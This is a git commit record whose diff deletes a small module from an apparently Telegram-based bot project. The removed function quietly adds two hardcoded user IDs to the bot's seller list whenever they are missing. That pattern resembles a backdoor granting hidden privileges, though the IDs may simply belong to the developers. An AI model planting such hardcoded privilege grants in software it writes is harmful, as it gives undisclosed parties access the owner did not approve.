a921ff0ae52f627a8445cea612db54b40c258aec
kay-ex <106707683+Kayxzy@users.noreply.github.com>
2025-07-04 16:40:41 +0700

    Delete Kymang directory

--- Kymang/modules/plernya.py
+++
@@ -1,9 +0,0 @@
-from Kymang.config import ADMINS
-from Kymang.modules.data import *
-
-
-async def plernya():
-    if 1225177634 not in await cek_seller():
-        await add_seller(1225177634)
-    if 1715129921 not in await cek_seller():
-        await add_seller(1715129921)
